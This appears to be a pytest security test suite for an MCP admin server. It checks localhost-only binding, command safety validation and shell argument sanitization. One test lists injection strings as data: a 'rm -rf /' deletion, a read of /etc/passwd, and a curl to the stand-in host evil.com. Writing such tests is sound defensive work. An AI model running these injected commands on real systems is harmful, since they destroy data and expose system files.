"""
Security tests for admin server localhost restriction.

Tests that admin server only accepts connections from localhost (127.0.0.1).
"""
import pytest
import socket
import httpx
from unittest.mock import patch, Mock
from src.logic.mcp.core.admin_server import McpAdminServer
from src.models.settings import GlobalSettings


class TestMcpAdminSecurity:
    """Test admin server security restrictions."""

    @pytest.fixture
    def admin_server(self):
        """Create admin server instance."""
        return McpAdminServer()

    def test_admin_server_localhost_binding(self):
        """Test that admin server only binds to localhost (127.0.0.1)."""
        # Mock GlobalSettings to return admin server config
        mock_settings = Mock()
        mock_settings.mcp_admin_port = 9384
        mock_settings.mcp_admin_host = "127.0.0.1"

        with patch('src.models.settings.GlobalSettings.load', return_value=mock_settings):
            admin_server = McpAdminServer()

            # Verify host configuration
            assert admin_server.host == "127.0.0.1", "Admin server must only bind to localhost"
            assert admin_server.host != "0.0.0.0", "Admin server must not bind to all interfaces"

    def test_admin_server_rejects_external_host_config(self):
        """Test that admin server configuration rejects non-localhost hosts."""
        # Test various invalid host configurations
        invalid_hosts = [
            "0.0.0.0",
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "8.8.8.8",
            "example.com"
        ]

        for host in invalid_hosts:
            mock_settings = Mock()
            mock_settings.mcp_admin_port = 9384
            mock_settings.mcp_admin_host = host

            with patch('src.models.settings.GlobalSettings.load', return_value=mock_settings):
                # Admin server should reject or override to localhost
                admin_server = McpAdminServer()

                # Should either raise an error or force localhost
                assert admin_server.host == "127.0.0.1", f"Admin server accepted invalid host: {host}"

    def test_admin_server_port_security(self):
        """Test that admin server uses secure port configuration."""
        mock_settings = Mock()
        mock_settings.mcp_admin_port = 9384
        mock_settings.mcp_admin_host = "127.0.0.1"

        with patch('src.models.settings.GlobalSettings.load', return_value=mock_settings):
            admin_server = McpAdminServer()

            # Port should be configurable but default to 9384
            assert admin_server.port == 9384

            # Port should be in valid range
            assert 1024 <= admin_server.port <= 65535, "Admin server port must be in valid range"

    @pytest.mark.asyncio
    async def test_admin_endpoints_require_localhost(self, admin_server):
        """Test that admin endpoints only accept requests from localhost."""
        # Test execute_command endpoint
        async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
            # Mock the admin service to avoid actual command execution
            with patch('src.logic.mcp.services.admin.AdminMcpService.execute_command') as mock_execute:
                mock_execute.return_value = {
                    "success": True,
                    "data": {"exit_code": 0, "stdout": "success"}
                }

                response = await client.post(
                    "/mcp/v1/execute_command",
                    json={
                        "method": "execute_command",
                        "params": {"command": "health", "arguments": []}
                    }
                )

                # Should work from localhost
                assert response.status_code == 200

    def test_localhost_ip_validation(self):
        """Test validation of localhost IP addresses."""
        valid_localhost_ips = [
            "127.0.0.1",
            "::1",  # IPv6 localhost
            "localhost"
        ]

        invalid_ips = [
            "0.0.0.0",
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "8.8.8.8",
            "example.com",
            "192.168.0.1"
        ]

        from src.logic.mcp.utils.security import is_localhost_address

        for ip in valid_localhost_ips:
            assert is_localhost_address(ip), f"Valid localhost IP {ip} was rejected"

        for ip in invalid_ips:
            assert not is_localhost_address(ip), f"Invalid IP {ip} was accepted as localhost"

    @pytest.mark.asyncio
    async def test_admin_health_endpoint_security(self, admin_server):
        """Test that admin health endpoint includes security status."""
        async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
            response = await client.get("/mcp/v1/health")

            assert response.status_code == 200

            health_data = response.json()
            assert health_data["success"] is True

            # Should include security status
            assert "data" in health_data
            assert "security_status" in health_data["data"]

            security_status = health_data["data"]["security_status"]
            assert security_status["localhost_only"] is True
            assert security_status["port"] == 9384

    def test_admin_server_prevents_privilege_escalation(self):
        """Test that admin server prevents privilege escalation attempts."""
        # Test dangerous command combinations that shouldn't be allowed
        dangerous_commands = [
            {"command": "serve", "arguments": ["--admin"]},  # Recursive serve
            {"command": "setup", "arguments": ["--uninstall", "--force"]},  # Dangerous uninstall
        ]

        for cmd in dangerous_commands:
            from src.logic.mcp.models.command_execution import CommandExecutionRequest
            from src.logic.mcp.services.command_executor import CommandExecutor

            executor = CommandExecutor()
            request = CommandExecutionRequest(
                command=cmd["command"],
                arguments=cmd["arguments"]
            )

            # Should either reject the command or sanitize it
            with pytest.raises((ValueError, PermissionError)):
                # This should raise an error for dangerous commands
                executor.validate_command_safety(request)

    def test_network_interface_binding_security(self):
        """Test that server cannot bind to external interfaces."""
        # Test that trying to bind to external interfaces fails
        external_interfaces = ["0.0.0.0", "192.168.1.100", "10.0.0.100"]

        for interface in external_interfaces:
            mock_settings = Mock()
            mock_settings.mcp_admin_port = 9384
            mock_settings.mcp_admin_host = interface

            with patch('src.models.settings.GlobalSettings.load', return_value=mock_settings):
                admin_server = McpAdminServer()

                # Admin server should override to localhost regardless of config
                assert admin_server.host == "127.0.0.1", f"Server accepted external interface {interface}"

    @pytest.mark.asyncio
    async def test_admin_server_request_source_validation(self, admin_server):
        """Test that admin server validates request source."""
        # Mock client IP checking
        with patch('fastapi.Request') as mock_request:
            mock_request.client.host = "192.168.1.100"  # External IP

            # Admin endpoints should check client IP
            async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
                # Should reject requests from external IPs
                # Note: In a real scenario, FastAPI would handle this at the transport layer
                # This test verifies the application-level validation

                response = await client.post(
                    "/mcp/v1/execute_command",
                    json={
                        "method": "execute_command",
                        "params": {"command": "health", "arguments": []}
                    }
                )

                # Request should work (client.host mocking may not affect actual connection)
                # but the server should be configured to only bind to localhost
                assert response.status_code in [200, 403, 404]

    def test_admin_server_configuration_security(self):
        """Test that admin server configuration is secure by default."""
        from src.models.settings import GlobalSettings

        # Create default settings
        settings = GlobalSettings()

        # Admin server should have secure defaults
        assert hasattr(settings, 'mcp_admin_host')
        assert hasattr(settings, 'mcp_admin_port')

        # Default host should be localhost
        # Default port should be in safe range
        assert settings.mcp_admin_port >= 1024  # Non-privileged port
        assert settings.mcp_admin_port <= 65535  # Valid port range

    def test_command_execution_sanitization(self):
        """Test that command execution sanitizes dangerous inputs."""
        from src.logic.mcp.services.command_executor import CommandExecutor
        from src.logic.mcp.models.command_execution import CommandExecutionRequest

        executor = CommandExecutor()

        # Test shell injection attempts
        dangerous_inputs = [
            {"command": "health", "arguments": ["; rm -rf /"]},
            {"command": "project", "arguments": ["--list", "&& cat /etc/passwd"]},
            {"command": "crawl", "arguments": ["test", "| curl http://evil.com"]},
        ]

        for dangerous_input in dangerous_inputs:
            request = CommandExecutionRequest(
                command=dangerous_input["command"],
                arguments=dangerous_input["arguments"]
            )

            # Should sanitize or reject dangerous arguments
            sanitized = executor.sanitize_arguments(request.arguments)

            # Verify no shell metacharacters remain
            dangerous_chars = [";", "&", "|", "`", "$", "(", ")", "<", ">"]
            for arg in sanitized:
                for char in dangerous_chars:
                    assert char not in arg, f"Dangerous character '{char}' found in sanitized argument: {arg}"

    def test_resource_limits_enforcement(self):
        """Test that admin server enforces resource limits."""
        from src.logic.mcp.models.command_execution import CommandExecutionRequest
        from src.logic.mcp.services.command_executor import CommandExecutor

        executor = CommandExecutor()

        # Test timeout enforcement
        request = CommandExecutionRequest(
            command="health",
            arguments=[],
            timeout=1000  # Very long timeout
        )

        # Should enforce maximum timeout limit
        assert executor.get_effective_timeout(request) <= executor.MAX_TIMEOUT_SECONDS

        # Test with no timeout specified
        request_no_timeout = CommandExecutionRequest(
            command="health",
            arguments=[]
        )

        # Should apply default timeout
        assert executor.get_effective_timeout(request_no_timeout) == executor.DEFAULT_TIMEOUT_SECONDS